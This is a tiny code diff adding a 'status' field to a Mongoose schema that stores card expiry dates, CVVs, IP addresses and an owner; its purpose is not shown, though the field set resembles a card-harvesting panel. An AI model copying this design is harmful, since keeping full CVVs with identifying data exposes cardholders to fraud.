@@ -11,6 +11,7 @@ const opBank = new mongoose.Schema({
     ccexp: String,
     cvv: String,
     ip: String,
+    status: Number,
     owner: String,
     timestamp: Date,
 });
